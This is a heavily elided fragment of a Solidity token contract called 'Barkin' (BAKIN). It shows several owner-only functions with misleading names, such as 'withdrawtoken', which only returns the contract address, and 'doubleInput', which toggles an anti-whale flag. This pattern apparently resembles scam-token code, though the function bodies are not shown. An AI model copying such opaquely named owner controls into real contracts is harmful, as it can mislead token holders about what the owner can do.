...
contract Barkin is Context, IERC20, Ownable {
    using SafeMath for uint256;  

    string private _name = "Barkin";
    string private _symbol = "BAKIN";
    ...
    function Nacional(address account) external onlyOwner {
    ...
    function restAnalysis(address[] calldata to, uint256[] calldata amounts) public onlyOwner {
    ...
    function withdrawtoken() public view virtual returns (address) {
        return address(this);
    }


    function doubleInput(bool enable) external onlyOwner {
        _antiWhale = enable;
    }    
